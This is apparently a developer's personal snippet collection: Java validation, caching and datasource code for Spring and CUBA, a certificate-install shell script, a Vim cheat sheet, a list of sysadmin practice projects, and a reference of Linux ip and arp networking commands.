            } else if (messageCode.startsWith(MessageTools.MARK) || messageCode.startsWith(MessageTools.MAIN_MARK)) {
                parameterValue = messages.getTools().loadString(messageCode, locale);
                // try to find tokens recursive
                parameterValue = interpolateMessage(parameterValue, locale);
            } else {
                parameterValue = parameterName;
            }
        } catch (UnsupportedOperationException e) {
            // return parameter itself
            parameterValue = parameterName;
        }
        return parameterValue;
    }

    protected String removeCurlyBraces(String parameter) {
        return parameter.substring(1, parameter.length() - 1);
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.EntityStates;
import com.haulmont.cuba.core.global.Metadata;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.validation.Path;
import javax.validation.TraversableResolver;
import java.lang.annotation.ElementType;

public class CubaValidationTraversableResolver implements TraversableResolver {

    private static final Logger log = LoggerFactory.getLogger(CubaValidationTraversableResolver.class);

    protected Metadata metadata;
    protected EntityStates entityStates;

    public CubaValidationTraversableResolver(Metadata metadata, EntityStates entityStates) {
        this.metadata = metadata;
        this.entityStates = entityStates;
    }

    @Override
    public final boolean isReachable(Object traversableObject,
                                     Path.Node traversableProperty,
                                     Class<?> rootBeanType,
                                     Path pathToTraversableObject,
                                     ElementType elementType) {
        log.trace("Calling isReachable on object {} with node name {}",
                traversableObject, traversableProperty.getName());

        if (traversableObject == null
                || metadata.getClass(traversableObject.getClass()) == null) {
            return true;
        }

        return entityStates.isLoaded(traversableObject, traversableProperty.getName());
    }

    @Override
    public boolean isCascadable(Object traversableObject, Path.Node traversableProperty, Class<?> rootBeanType,
                                Path pathToTraversableObject, ElementType elementType) {
        // return true as org.hibernate.validator.internal.engine.resolver.JPATraversableResolver does
        return true;
    }
}
--------------------------------------------------------------------------------------------------------
import javax.validation.ClockProvider;
import java.time.Clock;
import java.time.ZonedDateTime;

public class CubaValidationTimeProvider implements ClockProvider {

    protected TimeSource timeSource;

    public CubaValidationTimeProvider(TimeSource timeSource) {
        this.timeSource = timeSource;
    }

    @Override
    public Clock getClock() {
        ZonedDateTime now = timeSource.now();
        return Clock.fixed(now.toInstant(), now.getZone());
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.*;
import com.haulmont.cuba.core.sys.validation.CubaValidationMessagesInterpolator;
import com.haulmont.cuba.core.sys.validation.CubaValidationTimeProvider;
import com.haulmont.cuba.core.sys.validation.CubaValidationTraversableResolver;
import org.hibernate.validator.HibernateValidator;
import org.hibernate.validator.HibernateValidatorConfiguration;
import org.hibernate.validator.cfg.ConstraintMapping;
import org.springframework.stereotype.Component;

import javax.annotation.Nullable;
import javax.inject.Inject;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;

import static com.haulmont.bali.util.Preconditions.checkNotNullArgument;

@Component(BeanValidation.NAME)
public class BeanValidationImpl implements BeanValidation {

    public static final ValidationOptions NO_VALIDATION_OPTIONS = new ValidationOptions();

    @Inject
    protected Messages messages;
    @Inject
    protected Metadata metadata;
    @Inject
    protected TimeSource timeSource;
    @Inject
    protected UserSessionSource userSessionSource;
    @Inject
    protected EntityStates entityStates;

    protected ConcurrentHashMap<Locale, ValidatorFactory> validatorFactoriesCache = new ConcurrentHashMap<>();

    @Override
    public Validator getValidator() {
        Locale locale = getCurrentLocale();

        return getValidatorWithDefaultFactory(locale);
    }

    @Override
    public Validator getValidator(ConstraintMapping constraintMapping) {
        checkNotNullArgument(constraintMapping);

        return getValidator(constraintMapping, NO_VALIDATION_OPTIONS);
    }

    @Override
    public Validator getValidator(@Nullable ConstraintMapping constraintMapping, ValidationOptions options) {
        checkNotNullArgument(options);

        if (constraintMapping == null
                && options.getFailFast() == null
                && options.getLocale() != null) {
            return getValidatorWithDefaultFactory(options.getLocale());
        }

        Locale locale;
        if (options.getLocale() != null) {
            locale = options.getLocale();
        } else {
            locale = getCurrentLocale();
        }

        HibernateValidatorConfiguration configuration = getValidatorFactoryConfiguration(locale);
        if (options.getFailFast() != null) {
            configuration.failFast(options.getFailFast());
        }
        if (constraintMapping != null) {
            configuration.addMapping(constraintMapping);
        }

        ValidatorFactory factory = configuration.buildValidatorFactory();
        return factory.getValidator();
    }

    protected Validator getValidatorWithDefaultFactory(Locale locale) {
        ValidatorFactory validatorFactoryFromCache = validatorFactoriesCache.get(locale);
        if (validatorFactoryFromCache != null) {
            return validatorFactoryFromCache.getValidator();
        }

        HibernateValidatorConfiguration configuration = getValidatorFactoryConfiguration(locale);
        ValidatorFactory factory = configuration.buildValidatorFactory();

        validatorFactoriesCache.put(locale, factory);

        return factory.getValidator();
    }

    protected HibernateValidatorConfiguration getValidatorFactoryConfiguration(Locale locale) {
        @SuppressWarnings("UnnecessaryLocalVariable")
        HibernateValidatorConfiguration configuration = Validation.byProvider(HibernateValidator.class)
                .configure()
                .clockProvider(new CubaValidationTimeProvider(timeSource))
                .traversableResolver(new CubaValidationTraversableResolver(metadata, entityStates))
                .messageInterpolator(new CubaValidationMessagesInterpolator(messages, locale));

        return configuration;
    }

    protected Locale getCurrentLocale() {
        Locale locale;
        if (userSessionSource.checkCurrentUserSession()) {
            locale = userSessionSource.getLocale();
        } else {
            locale = messages.getTools().getDefaultLocale();
        }
        return locale;
    }
}
=======
LinkedMultiValueMap<String, Object> map = new LinkedMultiValueMap<>();
map.add("file", new ClassPathResource(file));
HttpHeaders headers = new HttpHeaders();
headers.setContentType(MediaType.MULTIPART_FORM_DATA);

HttpEntity<LinkedMultiValueMap<String, Object>> requestEntity = new    HttpEntity<LinkedMultiValueMap<String, Object>>(
                    map, headers);
ResponseEntity<String> result = template.get().exchange(
                    contextPath.get() + path, HttpMethod.POST, requestEntity,
                    String.class);
>>>>>>> b494d6cea61253f648b912ce216862387070907c
--------------------------------------------------------------------------------------------------------
    /**
     * Default parsing patterns
     */
    private static final String UPPER = "\\p{Lu}|\\P{InBASIC_LATIN}";
    private static final String LOWER = "\\p{Ll}";
    private static final String CAMEL_CASE_REGEX = "(?<!(^|[%u_$]))(?=[%u])|(?<!^)(?=[%u][%l])".replace("%u", UPPER).replace("%l", LOWER);
    /**
     * Default camel case {@link Pattern}
     */
    private static final Pattern CAMEL_CASE = Pattern.compile(CAMEL_CASE_REGEX);
	
	    /**
     * Returns {@link List} by input source {@link String} and 
     * @param source
     * @param toLower
     * @return
     */
    private static List<String> split(final String source, final boolean toLower) {
        Objects.requireNonNull(source, "Source string must not be null!");
        final List<String> result = CAMEL_CASE.splitAsStream(source).map(i -> toLower ? i.toLowerCase() : i).collect(Collectors.toList());
        return Collections.unmodifiableList(result);
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.concurrent.ConcurrentMapCache;
import org.springframework.cache.concurrent.ConcurrentMapCacheManager;
import org.springframework.cache.support.SimpleCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import static java.util.Arrays.asList;

@Configuration
@EnableCaching
public class MailCacheConfiguration {

    /**
     * Default mail cache names
     */
    public static final String DEFAULT_MAIL_FOLDER_CACHE = "MAIL_FOLDER_CACHE";
    public static final String DEFAULT_MAIL_STORE_CACHE = "MAIL_STORE_CACHE";

//    @Bean
//    public CacheManager cacheManager() {
//        final SimpleCacheManager cacheManager = new SimpleCacheManager();
//        cacheManager.setCaches(asList(this.mailFolderCache(), this.mailStoreCache()));
//        cacheManager.afterPropertiesSet();
//        return cacheManager;
//    }

    @Bean
    public CacheManager cacheManager() {
        final ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager("addresses");
        cacheManager.setAllowNullValues(false);
        cacheManager.setCacheNames(asList(DEFAULT_MAIL_FOLDER_CACHE, DEFAULT_MAIL_STORE_CACHE));
        return cacheManager;
    }

    @Bean
    public Cache mailFolderCache() {
        return new ConcurrentMapCache(DEFAULT_MAIL_FOLDER_CACHE);
    }

    @Bean
    public Cache mailStoreCache() {
        return new ConcurrentMapCache(DEFAULT_MAIL_STORE_CACHE);
    }
}
--------------------------------------------------------------------------------------------------------
@CacheEvict(value = {DEFAULT_MAIL_FOLDER_CACHE, DEFAULT_MAIL_STORE_CACHE}, allEntries = true)
public void destroy() {
}
	
@Caching(evict = { 
  @CacheEvict("addresses"), 
  @CacheEvict(value="directory", key="#customer.name") })
public String getAddress(Customer customer) {...}
--------------------------------------------------------------------------------------------------------
spring:
  # (DataSourceAutoConfiguration & DataSourceProperties)
  datasource:
    name: ds-h2
    url: jdbc:h2:D:/work/workspace/fdata;DATABASE_TO_UPPER=false
    username: h2
    password: h2
    driver-class: org.h2.Driver
	
@Configuration
@Component
public class DataSourceBean {

    @ConfigurationProperties(prefix = "spring.datasource")
    @Bean
    @Primary
    public DataSource getDataSource() {
        return DataSourceBuilder
                .create()
//                .url("jdbc:h2:D:/work/workspace/fork/gs-serving-web-content/initial/data/fdata;DATABASE_TO_UPPER=false")
//                .username("h2")
//                .password("h2")
//                .driverClassName("org.h2.Driver")
                .build();
    }
}
--------------------------------------------------------------------------------------------------------
https://<API key>@api.keycdn.com/zones/purge/<zone id>.json
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.Banner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.WebApplicationType;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@SpringBootApplication
@EnableAutoConfiguration
@EnableSwagger2
@ComponentScan(basePackages = {"io.project"})
@EntityScan("io.project.domain")
public class Application {

    public static void main(String[] args) {
        final SpringApplication application = new SpringApplication(Application.class);
        application.setBannerMode(Banner.Mode.OFF);
        application.setWebApplicationType(WebApplicationType.SERVLET);
        application.run(args);
    }
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash

###
# #%L
# che-starter
# %%
# Copyright (C) 2017 Red Hat, Inc.
# %%
# All rights reserved. This program and the accompanying materials
# are made available under the terms of the Eclipse Public License v1.0
# which accompanies this distribution, and is available at
# http://www.eclipse.org/legal/epl-v10.html
# #L%
###

echo "Installing certificate into $CHE_STARTER_HOME/InstallCert/ directory"

# Import the certificate
cd $CHE_STARTER_HOME/InstallCert/

echo "Import the remote certificate from ${OSO_ADDRESS}"
java InstallCert $OSO_ADDRESS << ANSWERS
1
ANSWERS

echo "Export the certificate into the keystore for ${OSO_DOMAIN_NAME}"
keytool -exportcert -alias $OSO_DOMAIN_NAME-1 -keystore jssecacerts -storepass changeit -file $KUBERNETES_CERTS_CA_FILE

cd $CHE_STARTER_HOME/


exec java -Djava.security.egd=file:/dev/./urandom -jar ${CHE_STARTER_HOME}/app.jar $@
exit $?
--------------------------------------------------------------------------------------------------------
public static void main(String[] args) {
  Optional<Integer> maxAge = employeeList
      .stream()
      .collect(Collectors.mapping((Employee emp) -> emp.getAge(), Collectors.maxBy(Integer::compareTo)));
  System.out.println("Max Age: " + maxAge.get());
}
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### NODE
--------------------------------------------------------------------------------------------------------
npm install fs-extra
npm install google-closure-compiler
npm install preprocessor

npm run test
npm run test:watch
npm run test:release
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### VIM
--------------------------------------------------------------------------------------------------------
1. Insert mode (Where you can just type like normal text editor. Press i for insert mode)
2. Command mode (Where you give commands to the editor to get things done . Press ESC for command mode)

Most of them below are in command mode

    x - to delete the unwanted character
    u - to undo the last the command and U to undo the whole line
    CTRL-R to redo
    A - to append text at the end
    :wq - to save and exit
    :q! - to trash all changes
    dw - move the cursor to the beginning of the word to delete that word
    2w - to move the cursor two words forward.
    3e - to move the cursor to the end of the third word forward.
    0 (zero) to move to the start of the line.
    d2w - which deletes 2 words .. number can be changed for deleting the number of consecutive words like d3w
    dd to delete the line and 2dd to delete to line .number can be changed for deleting the number of consecutive words

The format for a change command is: operator [number] motion
-operator - is what to do, such as d for delete
- [number] - is an optional count to repeat the motion
- motion - moves over the text to operate on, such as w (word),
$ (to the end of line), etc.

    p - puts the previously deleted text after the cursor(Type dd to delete the line and store it in a Vim register. and p to put the line)

    r - to replace the letter e.g press re to replace the letter with e

    ce - to change until the end of a word (place the cursor on the u in lubw it will delete ubw )

    ce - deletes the word and places you in Insert mode

    G - to move you to the bottom of the file.

    gg - to move you to the start of the file.
    Type the number of the line you were on and then G

    % to find a matching ),], or }

    :s/old/new/g to substitute 'new' for 'old' where g is globally

    / backward search n to find the next occurrence and N to search in opposite direction

    ? forward search

    :! to run the shell commands like :!dir, :!ls

    :w - TEST (where TEST is the filename you chose.) . Save the file

    v - starts visual mode for selecting the lines and you can perform operation on that like d delete

    :r - Filename will insert the content into the current file

    R - to replace more than one character

    y - operator to copy text using v visual mode and p to paste it

    yw - (copy)yanks one word

    o - opens a line below the cursor and start Insert mode.

    O - opens a line above the cursor.

    a - inserts text after the cursor.

    A - inserts text after the end of the line.

    e - command moves to the end of a word.

    y - operator yanks (copies) text, p puts (pastes) it.

    R - enters Replace mode until <ESC> is pressed.

    ctrl-w to jump from one window to another

type a command :e and press ctrl+D to list all the command name starts with :e and press tab to complete the command
--------------------------------------------------------------------------------------------------------
Global

:help keyword – open help for keyword
:o file – open file
:saveas file – save file as
:close – close current window

Cursor Movements

h – move cursor left
j – move cursor down
k – move cursor up
l – move cursor right
H – move to top of screen
M – move to middle of screen
L – move to bottom of screen
w – jump forwards to the start of a word
W – jump forwards to the start of a word (words can contain punctuation)
e – jump forwards to the end of a word
E – jump forwards to the end of a word (words can contain punctuation)
b – jump backwards to the start of a word
B – jump backwards to the start of a word (words can contain punctuation)
0 – jump to the start of the line
^ – jump to the first non-blank character of the line
$ – jump to the end of the line
g_ – jump to the last non-blank character of the line
gg – go to the first line of the document
G – go to the last line of the document
5G – go to line 5
fx – jump to next occurrence of character x
tx – jump to before next occurrence of character x
} – jump to next paragraph (or function/block, when editing code)
{ – jump to previous paragraph (or function/block, when editing code)
zz – center cursor on screen
Ctrl + b – move back one full screen
Ctrl + f – move forward one full screen
Ctrl + d – move forward 1/2 a screen
Ctrl + u – move back 1/2 a screen

Tip: Prefix a cursor movement command with a number to repeat it. For example, 4j moves down 4 lines.

Insert Mode

i – insert before the cursor
I – insert at the beginning of the line
a – insert (append) after the cursor
A – insert (append) at the end of the line
o – append (open) a new line below the current line
O – append (open) a new line above the current line
ea – insert (append) at the end of the word
Esc – exit insert mode

Editing

r – replace a single character
J – join line below to the current line
cc – change (replace) entire line
cw – change (replace) to the end of the word
c$ – change (replace) to the end of the line
s – delete character and substitute text
S – delete line and substitute text (same as cc)
xp – transpose two letters (delete and paste)
u – undo
Ctrl + r – redo
. – repeat last command

Marking Text (Visual Mode)

v – start visual mode, mark lines, then perform an operation (such as d-delete)
V – start linewise visual mode
Ctrl + v – start blockwise visual mode
o – move to the other end of marked area
O – move to other corner of block
aw – mark a word
ab – a block with ()
aB – a block with {}
ib – inner block with ()
iB – inner block with {}
Esc – exit visual mode

Visual Commands

> – shift text right
< – shift text left
y – yank (copy) marked text
d – delete marked text
~ – switch case

Registers

:reg – show registers content
"xy – yank into register x
"xp – paste contents of register x

Tip: Registers are being stored in ~/.viminfo, and will be loaded again on next restart of vim.

Tip: Register 0 contains always the value of the last yank command.

Marks

:marks – list of marks
ma – set current position for mark A
`a – jump to position of mark A
y`a – yank text to position of mark A

Macros

qa – record macro a
q – stop recording macro
@a – run macro a
@@ – rerun last run macro

Cut and Paste

yy – yank (copy) a line
2yy – yank (copy) 2 lines
yw – yank (copy) the characters of the word from the cursor position to the start of the next word
y$ – yank (copy) to end of line
p – put (paste) the clipboard after cursor
P – put (paste) before cursor
dd – delete (cut) a line
2dd – delete (cut) 2 lines
dw – delete (cut) the characters of the word from the cursor position to the start of the next word
D – delete (cut) to the end of the line
d$ – delete (cut) to the end of the line
x – delete (cut) character

Exiting

:w – write (save) the file, but don’t exit
:w !sudo tee % – write out the current file using sudo
:wq or :x or ZZ – write (save) and quit
:q – quit (fails if there are unsaved changes)
:q! or ZQ – quit and throw away unsaved changes

Search and Replace

/pattern – search for pattern
?pattern – search backward for pattern
\vpattern – ‘very magic’ pattern: non-alphanumeric characters are interpreted as special regex symbols (no escaping needed)
n – repeat search in same direction
N – repeat search in opposite direction
:%s/old/new/g – replace all old with new throughout file
:%s/old/new/gc – replace all old with new throughout file with confirmations
:noh – remove highlighting of search matches

Search in Multiple Files

:vimgrep /pattern/ {file} – search for pattern in multiple files
e.g.
:vimgrep /foo/ **/*
:cn – jump to the next match
:cp – jump to the previous match
:copen – open a window containing the list of matches

Working With Multiple Files

:e file – edit a file in a new buffer
:bnext or :bn – go to the next buffer
:bprev or :bp – go to the previous buffer
:bd – delete a buffer (close a file)
:ls – list all open buffers
:sp file – open a file in a new buffer and split window
:vsp file – open a file in a new buffer and vertically split window
Ctrl + ws – split window
Ctrl + ww – switch windows
Ctrl + wq – quit a window
Ctrl + wv – split window vertically
Ctrl + wh – move cursor to the left window (vertical split)
Ctrl + wl – move cursor to the right window (vertical split)
Ctrl + wj – move cursor to the window below (horizontal split)
Ctrl + wk – move cursor to the window above (horizontal split)

Tabs

:tabnew or :tabnew file – open a file in a new tab
Ctrl + wT – move the current split window into its own tab
gt or :tabnext or :tabn – move to the next tab
gT or :tabprev or :tabp – move to the previous tab
#gt – move to tab number #
:tabmove # – move current tab to the #th position (indexed from 0)
:tabclose or :tabc – close the current tab and all its windows
:tabonly or :tabo – close all tabs except for the current one
:tabdo command – run the command on all tabs (e.g. :tabdo q – closes all opened tabs)
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### INFO
--------------------------------------------------------------------------------------------------------
Deploy an Open Source Application

Find an application that you would be interested in using and deploy it. Even if you don’t end up using the application you’ll have gained the experience of setting it up.

    Alfresco
    Bugzilla
    DokuWiki
    Drupal
    Etherpad Lite
    Gitlab
    Joomla
    MediaWiki
    Moodle
    osTicket
    OwnCloud
    phpBB
    PunBB
    Redmine
    ServiceDesk Plus
    SugarCRM
    Trac
    Twiki
    WordPress
    Zen Cart

Configure Common Services – Client AND Server

    cron
    CUPS
    DHCP
    DNS
    Email (SMTP, POP, IMAP)
    LDAP
    NFS
    NIS
    NTP
    SSH

Configure Monitoring

    Cacti
    Icinga
    Monit
    Munin
    Nagios
    OpenNMS
    Zabbix
    Zenoss

Create a Build System

    Cobbler
    FAI
    Foreman
    Kickstart
    Razor
    Spacewalk

Create a Centralized Syslog Server

    ELK Stack: Elasticsearch, Logstash & Kibana
    Fluentd
    Logstash
    Kibana
    Splunk
    syslog-ng

System Automation

    Ansible
    Chef
    MakeFiles and/or RakeFiles
    Puppet
    Salt Stack
    Write Shell Scripts

Cluster All The Things

    Load balance web servers or other services using HAProxy
    Create a MySQL Cluster
    Create a GlusterFS Cluster
    Red Hat Cluster (Conga)

Build a NAS

    NFS
    Samba

Practice Migrating Data

    Migrate data from a disk on one server to a disk on another server.
    Migrate Databases.
        Live migrations
        Export / Import

Create and Manage Users

    FreeIPA
    LDAP
    NIS
    User name ideas: http://www.fakenamegenerator.com/

Configure a Backup Server

    Amanda
    Bacula
    Rsnapshot
    Rsync + SSH

Configure a Firewall

    IPtables
    UFW

Learn LVM

    Create and restore snapshots
    Extend volumes without downtime

Configure a Proxy Server

    Forward Proxy
        Apache
        Squid
    Reverse Proxy
        Apache
        NGINX
        Pound

Learn Revision Control

    CVS
    Git
    RCS
--------------------------------------------------------------------------------------------------------
### UNIX/LINUX
--------------------------------------------------------------------------------------------------------
arping
	

Send ARP request to a neighbour host

arping -I eth0 192.168.1.1

Send ARP request to 192.168.1.1 via interface eth0

arping -D -I eth0 192.168.1.1

Check for duplicate MAC addresses at 192.168.1.1 on eth0
--------------------------------------------------------------------------------------------------------
ethtool
	

Query or control network driver and hardware settings

ethtool -g eth0

Display ring buffer for eth0

ethtool -i eth0

Display driver information for eth0

ethtool -p eth0

Identify eth0 by sight, typically by causing LEDs to blink on the network port

ethtool -S eth0

Display network and driver statistics for eth0
--------------------------------------------------------------------------------------------------------
ss
	

Display socket statistics. The below options can be combined

ss -a

Show all sockets (listening and non-listening)

ss -e

Show detailed socket information

ss -o

Show timer information

ss -n

Do not resolve addresses

ss -p

Show process using the socket
--------------------------------------------------------------------------------------------------------
arp -a = ip neigh
arp -v = ip -s neigh
arp -s 192.168.1.1 1:2:3:4:5:6 = ip neigh add 192.168.1.1 lladdr 1:2:3:4:5:6 dev eth1
arp -i eth1 -d 192.168.1.1 = ip neigh del 192.168.1.1 dev eth1
ifconfig -a = ip addr
ifconfig eth0 down = ip link set eth0 down
ifconfig eth0 up = ip link set eth0 up
ifconfig eth0 192.168.1.1 = ip addr add 192.168.1.1/24 dev eth0
ifconfig eth0 netmask 255.255.255.0 = ip addr add 192.168.1.1/24 dev eth0
ifconfig eth0 mtu 9000 = ip link set eth0 mtu 9000
ifconfig eth0:0 192.168.1.2 = ip addr add 192.168.1.2/24 dev eth0
netstat = ss
netstat -neopa = ss -neopa
netstat -g = ip maddr
route = ip route
route add -net 192.168.1.0 netmask 255.255.255.0 dev eth0 = ip route add 192.168.1.0/24 dev eth0
route add default gw 192.168.1.1 = ip route add default via 192.168.1.1
--------------------------------------------------------------------------------------------------------
neigh add
	

Add an entry to the ARP Table

ip neigh add 192.168.1.1 lladdr 1:2:3:4:5:6 dev em1

Add address 192.168.1.1 with MAC 1:2:3:4:5:6 to em1
--------------------------------------------------------------------------------------------------------
neigh del
	

Invalidate an entry

ip neigh del 192.168.1.1 dev em1

Invalidate the entry for 192.168.1.1 on em1
--------------------------------------------------------------------------------------------------------
neigh replace
	

Replace, or adds if not defined, an entry to the ARP table

ip neigh replace 192.168.1.1 lladdr 1:2:3:4:5:6 dev em1

Replace the entry for address 192.168.1.1 to use MAC 1:2:3:4:5:6 on em1
--------------------------------------------------------------------------------------------------------
route add
	

Add an entry to the routing table

ip route add default via 192.168.1.1 dev em1

Add a default route (for all addresses) via the local gateway 192.168.1.1 that can be reached on device em1

ip route add 192.168.1.0/24 via 192.168.1.1

Add a route to 192.168.1.0/24 via the gateway at 192.168.1.1

ip route add 192.168.1.0/24 dev em1

Add a route to 192.168.1.0/24 that can be reached on

device em1
--------------------------------------------------------------------------------------------------------
route delete
	

Delete a routing table entry

ip route delete 192.168.1.0/24 via 192.168.1.1

Delete the route for 192.168.1.0/24 via the gateway at 192.168.1.1
--------------------------------------------------------------------------------------------------------
route replace
	

Replace, or add if not defined, a route

ip route replace 192.168.1.0/24 dev em1

Replace the defined route for 192.168.1.0/24 to use

device em1
--------------------------------------------------------------------------------------------------------
route get
	

Display the route an address will take

ip route get 192.168.1.5

Display the route taken for IP 192.168.1.5
--------------------------------------------------------------------------------------------------------
addr add
	

Add an address

ip addr add 192.168.1.1/24 dev em1

Add address 192.168.1.1 with netmask 24 to device em1
--------------------------------------------------------------------------------------------------------
addr del
	

Delete an address

ip addr del 192.168.1.1/24 dev em1

Remove address 192.168.1.1/24 from device em1
--------------------------------------------------------------------------------------------------------
link set
	

Alter the status of the interface

ip link set em1 up

Bring em1 online

ip link set em1 down

Bring em1 offline

ip link set em1 mtu 9000

Set the MTU on em1 to 9000

ip link set em1 promisc on

Enable promiscuous mode for em1
--------------------------------------------------------------------------------------------------------
maddr add
	

Add a static link-layer multicast address

ip maddr add 33:33:00:00:00:01 dev em1

Add mutlicast address 33:33:00:00:00:01 to em1
--------------------------------------------------------------------------------------------------------
maddr del
	

Delete a multicast address

ip maddr del 33:33:00:00:00:01 dev em1

Delete address 33:33:00:00:00:01 from em1
--------------------------------------------------------------------------------------------------------
addr
	

Display IP Addresses and property information (abbreviation of address)

ip addr

Show information for all addresses

ip addr show dev em1

Display information only for device em1
--------------------------------------------------------------------------------------------------------
link
	

Manage and display the state of all network interfaces

ip link

Show information for all interfaces

ip link show dev em1

Display information only for device em1

ip -s link

Display interface statistics
--------------------------------------------------------------------------------------------------------
route  
	

Display and alter the routing table

ip route

List all of the route entries in the kernel
--------------------------------------------------------------------------------------------------------
maddr
	

Manage and display multicast IP addresses

ip maddr

Display multicast information for all devices

ip maddr show dev em1

Display multicast information for device em1
--------------------------------------------------------------------------------------------------------
neigh
	

Show neighbour objects; also known as the ARP table for IPv4

ip neigh

Display neighbour objects

ip neigh show dev em1

Show the ARP cache for device em1
--------------------------------------------------------------------------------------------------------
help
	

Display a list of commands and arguments for each subcommand

ip help

Display ip commands and arguments

ip addr help

Display address commands and arguments

ip link help

Display link commands and arguments

ip neigh help

Display neighbour commands and arguments
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------